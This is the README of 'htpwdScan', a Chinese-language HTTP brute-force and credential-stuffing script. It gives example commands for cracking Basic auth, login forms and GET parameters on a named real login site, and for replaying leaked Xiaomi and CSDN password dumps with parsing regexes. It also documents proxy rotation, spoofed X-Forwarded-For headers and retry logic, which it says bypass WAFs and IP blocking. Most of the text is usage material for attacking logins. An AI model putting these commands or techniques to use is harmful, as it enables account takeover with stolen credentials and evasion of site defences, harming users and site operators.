htpwdScan
=================================
**htpwdScan** 是一个简单的HTTP暴力破解、撞库攻击脚本. 它的特性：
- 支持批量校验并导入HTTP代理，低频撞库可以成功攻击大部分网站，绕过大部分防御策略和waf
- 支持直接导入互联网上泄露的**社工库**，发起撞库攻击
- 支持导入超大字典
### 简单示例 ###
* HTTP Basic认证
	>htpwdScan.py -u=http://auth.58.com/ -basic user.txt password.txt
	>导入用户名密码字典即可

* 表单破解
	>htpwdScan.py -f post2.txt -d user=user.txt passwd=password.txt -err="success\":false"
	>从 post2.txt 导入抓的http包，user和passwd是需要破解的参数，而 user.txt password.txt 是保存了密码的字典文件
	>**success":false** 是选择的失败标记，标记中若有双引号，请记得用右斜杠 \ 转义

* GET参数破解
	>htpwdScan.py -d passwd=password.txt -u="http://xxx.com/index.php?m=login&username=test&passwd=test" -get -err="success\":false"
	> 使用-get参数告诉脚本此处是GET请求

* 撞库攻击
	>htpwdScan.py -f=post.txt -database loginname,passwd=xiaomi.txt -regex="(\S+)\s+(\S+)" -err="用户名或密码错误" -fip
	>htpwdScan.py -f=post.txt -database loginname,passwd=csdn.net.sql -regex="\S+ # (\S+) # (\S+)" -err="用户名或密码错误" -fip
	>使用小米和csdn库发起撞库攻击。post.txt是抓包的HTTP请求
	>参数-regex从文件提取参数的正则表达式，此处需分组，分组的方式是使用括号()
	>小米的数据格式是"xxx@163.com xxxxxxx"对应的regex格式为"(\S+)\s+(\S+)"
	>"(\S+)\s+(\S+)"指定第一个非空字符串填充loginname，第二个非空字符串填充passwd
	>csdn的数据行格式是"zdg # 12344321 # zdg@csdn.net"对应的regex格式为"(\S+) # (\S+)"
	>#号前面的非空字符串填充loginname，#号后面的非空字符串填充passwd
	>注意：-regex表达式分组与参数的顺序一一对应
	>-fip：启用伪造随机IP

* 校验HTTP代理
	> htpwdScan.py -u=http://www.baidu.com -get -proxylist=available.txt -checkproxy -suc="百度一下"
	>通过proxylist参数中的代理列表文件一个个去访问百度，如果匹配到百度一下这个字符串说明该代理服务器可用

## 完整说明 ##
	脚本支持的小功能较多，建议使用"-debug"参数查看HTTP请求是否有问题
	usage: htpwdScan.py [options]

	optional arguments:
	  -h, --help            显示帮助
	
	Target:(设定目标)
	  -u REQUESTURL		设定目标URL, 示例：-u="https://www.test.com/login.php"
	  -f REQUESTFILE	从文件导入HTTP请求
	  -https		当使用-f从文件导入HTTP请求时，启用https协议
	  -get			使用GET方法，默认：POST
	  -basic  [ ...]	HTTP Basic爆破。示例：-basic users.dic pass.dic
	
	Dictionary:(字典选项)
	  -d Param=DictFile [Param=DictFile ...]
	  	设定字典文件，支持哈希函数如md5, md5_16,sha1。示例：-d user=users.dic pass=md5(pass.dic)
	
	Detect:(标记处理)
	  -no302			无视302跳转, 默认302敏感
	  -err ERR [ERR ...]		响应文本破解失败标记，示例：-err "user not exist" "password wrong"
	  -suc SUC [SUC ...]		响应文本中的破解成功标记，示例：-suc "welcome," "admin"
	  -herr HERR			响应HTTP头的破解失败标记
	  -hsuc HSUC			响应HTTP头的破解成功标记
	  -rtxt RetryText		响应文本中的重试标记，出现则重试请求，示例：-rtxt="IP blocked"
	  -rntxt RetryNoText		响应文本中的重试标记，未出现则重试请求，示例：-rntxt="<body>"
	  -rheader RetryHeader		响应头中的重试标记，出现则重试请求，示例：-rheader="Set-Cookie:"
	  -rnheader RetryNoHeader	响应头中的重试标记，未出现则重试请求，示例：-rheader="HTTP/1.1 200 OK"
	
	Proxy and spoof:(代理和欺骗)
	  -proxy Server:Port		设定少量HTTP代理，示例：-proxy=127.0.0.1:8000,8.8.8.8:8000
	  -proxylist ProxyListFile	从文件批量导入HTTP代理，示例：-proxylist=proxys.txt
	  -checkproxy			检查代理服务器的可用性，可用代理输出到001.proxy.servers.txt
	  -fip				生成随机X-Forwarded-For头欺骗服务器
	  -fsid FSID			生成随机session ID，示例：-fsid PHPSESSID
	  -sleep seconds		每次HTTP结束等待seconds秒，避免IP被服务器屏蔽

	Database attack:(爆破字典)
	  -database DATABASE		导入社工库中的数据，示例：-database user,pass=csdn.txt
	  -regex REGEX			从社工库中提取数据的正则表达式，必须分组。示例：-regex="(\S+)\s+(\S+)"
	
	General:
	  -t THREADS			工作线程数，默认50
	  -o OUTPUT			输出文件，默认: 000.Cracked.Passwords.txt
	  -debug			进入debug模式检查HTTP请求和HTTP响应
	  -nov				只显示破解成功的条目，不显示进度
	  -v				显示程序版本号

